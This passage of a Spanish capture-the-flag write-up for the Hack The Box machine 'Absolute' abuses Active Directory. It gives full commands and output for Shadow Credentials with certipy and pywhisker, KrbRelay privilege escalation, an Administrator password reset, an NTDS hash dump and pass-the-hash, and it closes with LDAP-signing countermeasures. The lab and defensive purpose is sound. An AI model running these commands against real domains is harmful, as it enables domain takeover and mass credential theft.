Ejecutamos `certipy` para añadir Shadow Credentials al usuario `winrm_user`
```bash
$ KRB5CCNAME=m.lovegod.ccache certipy shadow auto -k -no-pass -u absolute.htb/m.lovegod@dc.absolute.htb -dc-ip 10.129.228.64 -target dc.absolute.htb -account winrm_user
Certipy v4.4.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_user'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'ef383036-f599-2138-8de7-fb9d1c0de5a1'
[*] Adding Key Credential with device ID 'ef383036-f599-2138-8de7-fb9d1c0de5a1' to the Key Credentials for 'winrm_user'
[*] Successfully added Key Credential with device ID 'ef383036-f599-2138-8de7-fb9d1c0de5a1' to the Key Credentials for 'winrm_user'
[*] Authenticating as 'winrm_user' with the certificate
[*] Using principal: winrm_user@absolute.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'winrm_user.ccache'
[*] Trying to retrieve NT hash for 'winrm_user'
[*] Restoring the old Key Credentials for 'winrm_user'
[*] Successfully restored the old Key Credentials for 'winrm_user'
[*] NT hash for 'winrm_user': 8738c7413a5da3bc1d083efc0ab06cb2
```

## Evil-WinRM
Al final tenemos un hash NT, si tratamos de utlizarlo para autenticarnos no podemos ya que este usuario también pertenece a Protected Users
```bash
$ evil-winrm.rb -i 10.129.228.64 -u winrm_user -H '8738c7413a5da3bc1d083efc0ab06cb2'

Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint
                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1
```

Además del hash NT, nos ha obtenido un TGT, así que lo importamos y nos conectamos con evil-winrm. Es necesario poner el nombre del DC en vez de la IP después del parámetro `-i`
```bash
$ KRB5CCNAME=./winrm_user.ccache evil-winrm -i dc.absolute.htb -r absolute.htb

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_user\Documents> cd ..\Desktop
d*Evil-WinRM* PS C:\Users\winrm_user\Desktop> dir

    Directory: C:\Users\winrm_user\Desktop
Mode                LastWriteTime         Length Name

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        5/31/2023   9:51 PM             34 user.txt

*Evil-WinRM* PS C:\Users\winrm_user\Desktop> type user.txt
4e3812370d00fb4cdbfc727b7dd3ee86
*Evil-WinRM* PS C:\Users\winrm_user\Desktop> 
```

## PyWhiskers - Alternativa a Certipy
Otra alternativa sería [PyWhiskers](https://github.com/ShutdownRepo/pywhisker), que al igual que Certipy, nos permite manipular el atributo Shadow Credentials de un usuario o computadora y obtener control total sobre ese objeto. Podemos ver si el usuario winrm_user es válido y si tiene el atributo `msDS-KeyCredentialLink` si sale `DeviceID:`
```bash
$ KRB5CCNAME=m.lovegod.ccache python3 pywhisker.py --action list -d absolute.htb -u m.lovegod -p 'AbsoluteLDAP2022!' --dc-ip 10.129.228.64 -t winrm_user -k
[*] Searching for the target account
[*] Target user found: CN=winrm_user,CN=Users,DC=absolute,DC=htb
[*] Listing devices for winrm_user
[*] DeviceID: 05c89ad0-0706-1bbe-e2b4-189876687fde | Creation Time (UTC): 2022-06-09 14:09:33.669683
```

Añadimos una nueva Shadow Credentials
```bash
$ KRB5CCNAME=m.lovegod.ccache python3 pywhisker.py --action add -d absolute.htb -u m.lovegod -p 'AbsoluteLDAP2022!' --dc-ip 10.129.228.64 -t winrm_user -k
[*] Searching for the target account
[*] Target user found: CN=winrm_user,CN=Users,DC=absolute,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 78dff7e3-cfa6-f3cc-8320-edd109738ee2
[*] Updating the msDS-KeyCredentialLink attribute of winrm_user
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: 9oXHASfh.pfx
[*] Must be used with password: fDWLkveQkuOuBoBNEbnb
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

El anterior comando nos genera el certificado `9oXHASfh.pfx` con contraseña `fDWLkveQkuOuBoBNEbnb`, que podemos usar junto a [PKINITTools](https://github.com/dirkjanm/PKINITtools) para obtener un TGT
```bash
$ python3 gettgtpkinit.py -cert-pfx ../pywhisker/9oXHASfh.pfx -pfx-pass fDWLkveQkuOuBoBNEbnb absolute.htb/winrm_user -dc-ip 10.129.228.64 winrm_user.ccache
2023-06-02 20:51:51,151 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2023-06-02 20:51:51,170 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2023-06-02 20:52:15,567 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2023-06-02 20:52:15,567 minikerberos INFO     dbabcfe08d101d1d0f24c960f2ff7849d2b3c94a4676233b5c5d5c60f377b50c
INFO:minikerberos:dbabcfe08d101d1d0f24c960f2ff7849d2b3c94a4676233b5c5d5c60f377b50c
2023-06-02 20:52:15,571 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

Le hemos indicado `winrm_user.ccache` como fichero de salida, que podemos usar con evil-winrm para obtener una shell en el sistema
```bash
$ file winrm_user.ccache
winrm_user.ccache: data

$ KRB5CCNAME=winrm_user.ccache evil-winrm -i dc.absolute.htb -r absolute.htb

Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_user\Documents> 
```

# Shell - Administrator 
## KrbRelay
KrbRelay es una vulnerabilidad en la autenticación de Kerberos, en la que un atacante intercepta las solicitudes y luego la retransmite a otro destino en nombre del cliente original, lo que permite al atacante obtener acceso a los recursos del servidor sin necesidad de comprometer las credenciales reales del usuario

Datos sobre KrbRelay
1. En febrero del 2022 se creó una herramienta que automatiza este ataque llamada KrbRelay
2. Microsoft no planeaba parchear esta vulnerabilidad, pero cambió su postura en octubre del 2022, siendo reconocida como una vulnerabilidad signficativa en la que se necesitaba tomar medidas.
	<blockquote class="twitter-tweet"><p lang="en" dir="ltr">This MS patch also effects krbrelay. It looks like we had our fun with rpc-&gt;ldap <a href="https://t.co/lAWJltswBg">https://t.co/lAWJltswBg</a></p>&mdash; Cube0x0 (@cube0x0) <a href="https://twitter.com/cube0x0/status/1583568590393204736?ref_src=twsrc%5Etfw">October 21, 2022</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
3. Para que KrbRelay funcione, se deben cumplir 2 condiciones. No tener instalados los parches de octubre del 2022 y tener la firma de LDAP desactivada, que es la configuración predeterminada en Windows

Vamos a utilzar la versión compilada de KrbRelay del repositorio [SharpCollection](https://github.com/Flangvik/SharpCollection.git)

Para que este exploit funcione, se necesita una sesión interactiva, o una consola. Por ello vamos a hacer uso de [RunasCs](https://github.com/antonioCoco/RunasCs). Ya que en estas sesiones, a diferencia de la shell con WinRM que tenemos, las credenciales son guardadas en memoria y accesibles al exploit

Subimos ambos ejecutables
```bash
*Evil-WinRM* PS C:\programdata> upload ./SharpCollection/NetFramework_4.7_Any/KrbRelay.exe
                                        
Info: Uploading /home/d4z/htb/machines/Absolute/exploits/SharpCollection/NetFramework_4.7_Any/KrbRelay.exe to C:\programdata\KrbRelay.exe
                                        
Data: 2135380 bytes of 2135380 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\programdata> upload ./RunasCs/RunasCs.exe
                                        
Info: Uploading /home/d4z/htb/machines/Absolute/exploits/RunasCs/RunasCs.exe to C:\programdata\RunasCs.exe
                                        
Data: 68948 bytes of 68948 bytes copied
                                        
Info: Upload successful!
```

Vamos a añadir al usuario winrm_user al grupo Administrators. El CLSID del [ejemplo](https://github.com/cube0x0/KrbRelay#examples) no funciona, es por ello que vamos a hacer uso del [CLSID de Trusted Installer](https://github.com/ohpe/juicy-potato/blob/master/CLSID/Windows_10_Pro/README.md) 
```bash
*Evil-WinRM* PS C:\programdata> .\RunasCs.exe m.lovegod 'AbsoluteLDAP2022!' -l 9 ".\KrbRelay.exe -spn ldap/dc.absolute.htb -clsid 3c6859ce-230b-48a4-be6c-932c0c202048 -add-groupmember Administrators winrm_user"

[*] Relaying context: absolute.htb\DC$
[*] Rewriting function table
[*] Rewriting PEB
[*] GetModuleFileName: System
[*] Init com server
[*] GetModuleFileName: C:\programdata\KrbRelay.exe
[*] Register com server
objref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGgQIAAAAAAADMtYv1t5fJFAE1Tijf+x+cAsAAACgO///J9xSrdiOY0iIADAAHADEAMgA3AC4AMAAuADAALgAxAAAAAAAJAP//AAAeAP//AAAQAP//AAAKAP//AAAWAP//AAAfAP//AAAOAP//AAAAAA==:

[*] Forcing SYSTEM authentication
[*] Using CLSID: 3c6859ce-230b-48a4-be6c-932c0c202048
[*] apReq: 608206b406092a864886f71201020201006e8206a33082069fa003020105a10302010ea20703050020000000a38204e1618204dd308204d9a003020105a10e1b0c4142534f4c5554452e485442a2223020a003020102a11930171b046c6461701b0f64632e6162736f6c7574652e687462a382049c30820498a003020112a103020104a282048a048204862fa772b3b0a5cff7eb9564643cb9b746002a3278ff0f5369afb893751c814d0d602a1618d19bf820a93479cf33953846c90fd1e71c27047d74ca687ebf1ce77b7dedd41ba319e8f518b08ebf52751d383f2ff5248dceadb90913ae72e6743e5a943a76fe377a56c9919c219a8c9005d0fa7d18e1fdfa24d6c8707bab38d22c178081eaab1495cf941e5092fa04ee6351f9bc844994089bfc572d89dbbc84982b4f406d8c54213c0c886b842ddfb7e51f8d4fdae65414eb89d10108b73f29db94dfe2558ff450de075c19620748807198d1cfb9eebf51a7990a2477de61a9fc2bc008b55806b4c3975c4bbd41b49fc4bfa28819679207cec6f28ee437f2488989ac78f5f187cb22d63e23ef5be85250020375a156a0f1daa45cdc0646e7317d1ae67c2c61a2e5b666c76998c73af65c7fbef0d9e398b17e03fb6bae7b13e091da3045febccf153071a5fd6925a8efe04b3a3cc52b70de34b54a9b1d5fd44d5c1cb7c6866f31744817acddc32855d2692b7738820538f091ad3a4f50f3562dbfeb8af0fbb36bc501594cdccc20ce572c0ad08bfaea086e8185d88981ff9678c7f50788312e945203a0683fc18872d3c3cc87a50bd3a0550d18246221ce9006f72bdbb22f7c27c2fd81ec5387b14fd25227c9f15bf26a52eccfba2f4ed8b6a3e5194fb19e328948107eafd7cb5da185a5dd7ba9a8e35e92bc63ced82e632d842ee38f32b4000f16efc36461ccf3914182be916cae7eb62a95b380144048a0007da2e15b94928b5506891833983a956a171cb2bc564504ffe10d66a483fdd4259101b6d7dd4591a461a7ab4bd2d8195c1556eed0056bbd42b953882382bf346b29a6f037ba6dc490cfc37510d1a33965c36ca721bc7d4981e8eef69449be10c506694c0ac8d2bc7d2d9edba83c057efe07ecb415228524eb8db08c08508715974cd85e1e7d5315bc0499baf56bed8736f1ff3d9649358253320347c974d06cd923955ae65bd326dfbf819869d4c01df30790d104c91c3c6012388ea657b9aad2a8e0b1d472afb40c50fdb029033b3d954bb61f48345c4e0a14e9a3731b23c3084067ed9a077c731bf9eff367b0a9817363bff2227365bbc656f42fa3d754fc00e2240d7d5ffd7fd3d126dd5eccf5de1b5bbabc86b212fa2d0cf4a7cfdb2d570fce2413c495b676366fbce334bbbc8f98328076074a8cd654ac0131c9d9c8d82e
dcf5cce8cdbab898449ee0b6972893a084d3510f0f70c14194388273f2a9a9349947ce8e68b2540a5f9f4163d1bf9e982878af0b0428f084514e7619929cd6e9c14cd4c1efc82f101d2f33f1852d64f695331d6fe461e18651fdc97275a49ab18473b7b902425ee409e2920fddbd9535a653385783f15cb0c31c0e465ac984c1c02e0b27fce8cf388e3f1871b6d66387309536f5c57415beb1f9f6adfbb75063a1449873137650bef2809783bb6f55f891e1efc9a03d174f2927955f827f96da4130b70928c923f255014e641bc71c8d8fba0e4885674562b29c4fc38be27ba5adab1b1904247baaf69267165b2337b0e010dff979fd61ccb2d23331531467a78638dd6e96e9bf78b653362b84c176d5810a6494a9480eeefc644ee1a5e4e9983328d158d9a5eec2a48201a33082019fa003020112a28201960482019235f2d6b9e9d842ec9457a02fee534e7370c3840e2f7498ab0e0183b7c0222ec191dbea982ffa813c17b4eb4789e7a14bd4f50492215f9710f44903d362dd88de5db5a2e8d1024e5fa94e3560ec0568659b3937364d9aa473acd43d371539a03d0a1ae84d0160ee7e935670c6aa0e0d101f89484c562c55ccb63c30cf7664b964c6bc5c7805d623343eefe8834cf5fcff0639f6789020f342e34972725572befde315138717de2625f2f36331d2186a6111e77b4de4e7aebd0da0cd8b192afe0e47ac0b714d1020c4e0ab3a7911c67cb0a385e670aae770f1781069ed2497517552990269e2b739a3f03f76354fd81f765592a0802aba12dc5aa58ec02f35f558e402f4560d4efa189d1ee869c3bb914d2355d2af679a8335c826d506a2d938e1b2ebf5b7f9867d6d72eb10587aee1ac2dcc99d52c367d674e130a6017478a007538624ff2779cbf73f60b8141bb9784b5b32cde966228dc96eae6b56921e7fbe1071727934051d9bca4c9a1923f7e193187d80d722a1c4ed738ff060b495506fd36d797c7d2faeff965082db01dba144caef
[*] bind: 0
[*] ldap_get_option: LDAP_SASL_BIND_IN_PROGRESS
[*] apRep1: 6f8188308185a003020105a10302010fa2793077a003020112a270046e3382412129039a0f447be72e69b53fcc1399ca6d7e7c68f000b38ff9a655a706e3c5a8bc366ac5c1e43ea24bcb15b5ea7cd1195dab5283c2b707c3a04ab261ab05a73709831f6b634977a2ff84c56066eedee47e2c52e81a71ea66dd7ac9a1ec126237688327865ee9f32a6a3da5
[*] AcceptSecurityContext: SEC_I_CONTINUE_NEEDED
[*] fContextReq: Delegate, MutualAuth, UseDceStyle, Connection
[*] apRep2: 6f5b3059a003020105a10302010fa24d304ba003020112a244044268397229291e3f177587b7b6d3e2b2f629b44e57260caa28f0ec6b58eede7854213f2c888cfc8e318dd3d54965dd06770d425a42e3b8eb1ba9edfa1f4373119c5b60
[*] bind: 0
[*] ldap_get_option: LDAP_SUCCESS
[+] LDAP session established
[*] ldap_modify: LDAP_SUCCESS
```

Verificamos que el usuario ha sido añadido exitosamente al grupo `Administrators`
```bash
*Evil-WinRM* PS C:\programdata> net user winrm_user
User name                    winrm_user
Full Name
Comment                      Used to perform simple network tasks
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/9/2022 1:25:51 AM
Password expires             Never
Password changeable          6/10/2022 1:25:51 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   6/1/2023 8:24:37 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Management Use
Global Group memberships     *Domain Users         *Protected Users
The command completed successfully.
```

Para poder obtener la flag de root tenemos abrir una nueva consola
```bash
$ KRB5CCNAME=ccache/winrm_user.ccache evil-winrm -i dc.absolute.htb -r absolute.htb

Evil-WinRM shell v3.5

*Evil-WinRM* PS C:\Users\winrm_user\Documents> cd c:\users\administrator\desktop
*Evil-WinRM* PS C:\users\administrator\desktop> dir


    Directory: C:\users\administrator\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         6/1/2023   9:41 PM             34 root.txt


*Evil-WinRM* PS C:\users\administrator\desktop> type root.txt
20cfa6b13f361b7ea076a0b49b22ba7a
```

Otra opción interesante es la de cambiar la contraseña al usuario Administrador
```bash
.\RunasCs.exe m.lovegod 'AbsoluteLDAP2022!' -l 9 ".\KrbRelay.exe -spn ldap/dc.absolute.htb -clsid 3c6859ce-230b-48a4-be6c-932c0c202048 -ssl -reset-password administrator Password123!"
```

```bash
$ evil-winrm -i 10.129.228.64 -u administrator -p 'Password123!'

Evil-WinRM shell v3.5

*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

Con crackmapexec podemos dumpear el ntds
```bash
crackmapexec smb -dc-ip dc.absolute.htb -u 'Administrator' -p 'Password123!' --ntds
SMB         dc.absolute.htb 445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:c-ip) (signing:True) (SMBv1:False)
SMB         dc.absolute.htb 445    DC               [+] c-ip\Administrator:Password123! (Pwn3d!)
SMB         dc.absolute.htb 445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         dc.absolute.htb 445    DC               Administrator\Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
SMB         dc.absolute.htb 445    DC               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         dc.absolute.htb 445    DC               krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3ca378b063b18294fa5122c66c2280d4:::
SMB         dc.absolute.htb 445    DC               J.Roberts:1103:aad3b435b51404eeaad3b435b51404ee:7d6b7511772593b6d0a3d2de4630025a:::
SMB         dc.absolute.htb 445    DC               M.Chaffrey:1104:aad3b435b51404eeaad3b435b51404ee:13a699bfad06afb35fa0856f69632184:::
SMB         dc.absolute.htb 445    DC               D.Klay:1105:aad3b435b51404eeaad3b435b51404ee:21c95f594a80bf53afc78114f98fd3ab:::
SMB         dc.absolute.htb 445    DC               s.osvald:1106:aad3b435b51404eeaad3b435b51404ee:ab14438de333bf5a5283004f660879ee:::
SMB         dc.absolute.htb 445    DC               j.robinson:1107:aad3b435b51404eeaad3b435b51404ee:0c8cb4f338183e9e67bbc98231a8e59f:::
SMB         dc.absolute.htb 445    DC               n.smith:1108:aad3b435b51404eeaad3b435b51404ee:ef424db18e1ae6ba889fb12e8277797d:::
SMB         dc.absolute.htb 445    DC               m.lovegod:1109:aad3b435b51404eeaad3b435b51404ee:a22f2835442b3c4cbf5f24855d5e5c3d:::
SMB         dc.absolute.htb 445    DC               l.moore:1110:aad3b435b51404eeaad3b435b51404ee:0d4c6dccbfacbff5f8b4b31f57c528ba:::
SMB         dc.absolute.htb 445    DC               c.colt:1111:aad3b435b51404eeaad3b435b51404ee:fcad808a20e73e68ea6f55b268b48fe4:::
SMB         dc.absolute.htb 445    DC               s.johnson:1112:aad3b435b51404eeaad3b435b51404ee:b922d77d7412d1d616db10b5017f395c:::
SMB         dc.absolute.htb 445    DC               d.lemm:1113:aad3b435b51404eeaad3b435b51404ee:e16f7ab64d81a4f6fe47ca7c21d1ea40:::
SMB         dc.absolute.htb 445    DC               svc_smb:1114:aad3b435b51404eeaad3b435b51404ee:c31e33babe4acee96481ff56c2449167:::
SMB         dc.absolute.htb 445    DC               svc_audit:1115:aad3b435b51404eeaad3b435b51404ee:846196aab3f1323cbcc1d8c57f79a103:::
SMB         dc.absolute.htb 445    DC               winrm_user:1116:aad3b435b51404eeaad3b435b51404ee:8738c7413a5da3bc1d083efc0ab06cb2:::
SMB         dc.absolute.htb 445    DC               DC$:1000:aad3b435b51404eeaad3b435b51404ee:a7864ab463177acb9aec553f18f42577:::
```

Y autenticarnos con el hash
```bash
$ evil-winrm -i 10.129.228.64 -u 'Administrator' -H '2b576acbe6bcfda7294d6bd18041b8fe'
```

Desde esta consola podemos ver que efectivamente es un Windows Server 2019 Estándar
```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> systeminfo

Host Name:                 DC
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Primary Domain Controller
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00429-00521-62775-AA530
Original Install Date:     7/20/2021, 11:21:49 AM
System Boot Time:          6/1/2023, 9:40:14 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2295 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.17369862.B64.2012240522, 12/24/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              it;Italian (Italy)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,859 MB
Virtual Memory: Max Size:  4,799 MB
Virtual Memory: Available: 3,665 MB
Virtual Memory: In Use:    1,134 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    absolute.htb
Logon Server:              N/A
Hotfix(s):                 10 Hotfix(s) Installed.
                           [01]: KB5016713
                           [02]: KB4512577
                           [03]: KB4535680
                           [04]: KB4577586
                           [05]: KB4589208
                           [06]: KB5012170
                           [07]: KB5017315
                           [08]: KB5012675
                           [09]: KB5014031
                           [10]: KB5015896
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 3
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.228.64
                                 [02]: fe80::bc18:1e7f:6ec4:6749
                                 [03]: dead:beef::bc18:1e7f:6ec4:6749
                                 [04]: dead:beef::115
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

# Contramedidas contra KRBRelay
Para evitar este ataque vamos a [habilitar la firma por LDAP](https://www.lepide.com/blog/how-to-require-ldap-signing-in-windows-server/) 

Habilitamos RDP en el DC y nos conectamos con algún cliente, como remmina
```bash
crackmapexec smb 10.129.228.64 -u Administrator -p 'Password123!' -M rdp -o ACTION=enable
```

Abre `Group Policy Management` y clica en `Edit`
![](assets/img/htb/absolute/21.png)

Navega a `Computer Configuration\Policies\Windows Settings\Security Settings\Local Policies\Security Options`

Busca la política `Domain Controller: LDAP server signing requirements` y cambia el valor a `Require signing`
![](assets/img/htb/absolute/22.png)

Y también en `Network security: LDAP client signing requirements`
![](assets/img/htb/absolute/23.png)

Abre una consola y actualiza la política de seguridad
![](assets/img/htb/absolute/24.png)

Tratamos de ejecutar el ataque en nuestra máquina atacante y observamos que no tiene éxito
```bash
*Evil-WinRM* PS C:\programdata> .\RunasCs.exe m.lovegod 'AbsoluteLDAP2022!' -l 9 ".\KrbRelay.exe -spn ldap/dc.absolute.htb -clsid 3c6859ce-230b-48a4-be6c-932c0c202048 -add-groupmember
Administrators winrm_user"

[*] Relaying context: absolute.htb\DC$
[*] Rewriting function table
[*] Rewriting PEB
[*] GetModuleFileName: System
[*] Init com server
[*] GetModuleFileName: C:\programdata\KrbRelay.exe
[*] Register com server
objref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGgQIAAAAAAAB4KplREi4FFGeMIAqYLH8nApQAAFwW//+vpO4nPH6EyyIADAAHADEAMgA3AC4AMAAuADAALgAxAAAAAAAJAP//AAAeAP//AAAQAP//AAAKAP//AAAWAP//AAAfAP//AAAOAP//AAAAAA==:

[*] Forcing SYSTEM authentication
[*] Using CLSID: 3c6859ce-230b-48a4-be6c-932c0c202048
[*] apReq: 608206b406092a864886f71201020201006e8206a33082069fa003020105a10302010ea20703050020000000a38204e1618204dd308204d9a003020105a10e1b0c4142534f4c5554452e485442a2223020a003020102a11930171b046c6461701b0f64632e6162736f6c7574652e687462a382049c30820498a003020112a103020104a282048a048204862fa772b3b0a5cff7eb9564643cb9b746002a3278ff0f5369afb893751c814d0d602a1618d19bf820a93479cf33953846c90fd1e71c27047d74ca687ebf1ce77b7dedd41ba319e8f518b08ebf52751d383f2ff5248dceadb90913ae72e6743e5a943a76fe377a56c9919c219a8c9005d0fa7d18e1fdfa24d6c8707bab38d22c178081eaab1495cf941e5092fa04ee6351f9bc844994089bfc572d89dbbc84982b4f406d8c54213c0c886b842ddfb7e51f8d4fdae65414eb89d10108b73f29db94dfe2558ff450de075c19620748807198d1cfb9eebf51a7990a2477de61a9fc2bc008b55806b4c3975c4bbd41b49fc4bfa28819679207cec6f28ee437f2488989ac78f5f187cb22d63e23ef5be85250020375a156a0f1daa45cdc0646e7317d1ae67c2c61a2e5b666c76998c73af65c7fbef0d9e398b17e03fb6bae7b13e091da3045febccf153071a5fd6925a8efe04b3a3cc52b70de34b54a9b1d5fd44d5c1cb7c6866f31744817acddc32855d2692b7738820538f091ad3a4f50f3562dbfeb8af0fbb36bc501594cdccc20ce572c0ad08bfaea086e8185d88981ff9678c7f50788312e945203a0683fc18872d3c3cc87a50bd3a0550d18246221ce9006f72bdbb22f7c27c2fd81ec5387b14fd25227c9f15bf26a52eccfba2f4ed8b6a3e5194fb19e328948107eafd7cb5da185a5dd7ba9a8e35e92bc63ced82e632d842ee38f32b4000f16efc36461ccf3914182be916cae7eb62a95b380144048a0007da2e15b94928b5506891833983a956a171cb2bc564504ffe10d66a483fdd4259101b6d7dd4591a461a7ab4bd2d8195c1556eed0056bbd42b953882382bf346b29a6f037ba6dc490cfc37510d1a33965c36ca721bc7d4981e8eef69449be10c506694c0ac8d2bc7d2d9edba83c057efe07ecb415228524eb8db08c08508715974cd85e1e7d5315bc0499baf56bed8736f1ff3d9649358253320347c974d06cd923955ae65bd326dfbf819869d4c01df30790d104c91c3c6012388ea657b9aad2a8e0b1d472afb40c50fdb029033b3d954bb61f48345c4e0a14e9a3731b23c3084067ed9a077c731bf9eff367b0a9817363bff2227365bbc656f42fa3d754fc00e2240d7d5ffd7fd3d126dd5eccf5de1b5bbabc86b212fa2d0cf4a7cfdb2d570fce2413c495b676366fbce334bbbc8f98328076074a8cd654ac0131c9d9c8d82edcf5cce8cdbab898449ee0b6972893a084d3510f0f70c14194388273f2a9a9349947ce8e68b2540a5f9f4163d1bf9e982878af0b0428f084514e7619929cd6e9c14cd4c1efc82f101d2f33f1852d64f695331d6fe461e18651fdc97275a49ab18473b7b902425ee409e2920fddbd9535a653385783f15cb0c31c0e465ac984c1c02e0b27fce8cf388e3f1871b6d66387309536f5c57415beb1f9f6adfbb75063a1449873137650bef2809783bb6f55f891e1efc9a03d174f2927955f827f96da4130b70928c923f255014e641bc71c8d8fba0e4885674562b29c4fc38be27ba5adab1b1904247baaf69267165b2337b0e010dff979fd61ccb2d23331531467a78638dd6e96e9bf78b653362b84c176d5810a6494a9480eeefc644ee1a5e4e9983328d158d9a5eec2a48201a33082019fa003020112a282019604820192106e47dbceb7bf3cf784327e9d428aaca3895765884c3d74047a9967238b6f9c2a4544eeaf9c638be006337e28efa8ffcf5854c17e376f1fbb02a291524871a2b7591dd7372bb329e78f83655a6288959b908511693657844cb5cff85827cbfcb25153f69f940a8101937e6293882e05a8cb5b3d2bf14c709da522b0b3002fdd0f4bff0c8a33fe8a71fc4d569e72daf5c09e004c8df5a3d10b8e8cb41fd5c9562413321267d137ba10858ab45f6585a6618cf43c428cbbd4e37b5b0d1c937ee7e764301afb9f4695f760eb29fc16b78e15f14299d9b51387571ed2937bf2ae6e29269a385338793b772b62911e711bcaa04dd5325594241f9317f618988d2b097b01940a94ec15797c6845c922dcf0f0a0d4426e1b124e1cb9ce9dad1b695ca26304e77e8e9845e20d0aa8728ee0d751c475a5aa63a3ac1c9952fe409f753aa22e6aeb5c1ffd8b6c4a274deb9042f2c3e60df3922d6ae7ed41f4bae3f62848f5b39210ea00aa175b6a90194a50a803f18b7673a0ed603f1b46a606e506876c98fcdc02705331c84db732b45ce79b583cf4d4
[*] bind: 0
[*] ldap_get_option: LDAP_SASL_BIND_IN_PROGRESS
[*] apRep1: 6f8188308185a003020105a10302010fa2793077a003020112a270046e3bac712f6334071226c25e895f570151fe1166a42a068b2cd7850c3b9c81df87839f350070dea732d2d731b291e4b1454a58e8ad0357e96d273d1534290b7072cfdebb6e6355a7f29890f65c9684cfcccc47ec04b4e5b43c0c923aa6f2909cf646c73069067f2838d455d471d380
[*] AcceptSecurityContext: SEC_I_CONTINUE_NEEDED
[*] fContextReq: Delegate, MutualAuth, UseDceStyle, Connection
[*] apRep2: 6f5b3059a003020105a10302010fa24d304ba003020112a2440442d79574b57c4664dad434b29e5de65a74a83e1eec685238ab4b16ffd1f279a05b62e11e86a439fdd1336030ee54342f262cc82f65126ced2423ae468461511bab82b0
[*] bind: 8
[*] ldap_get_option: 8
[-] Ldap failed
```
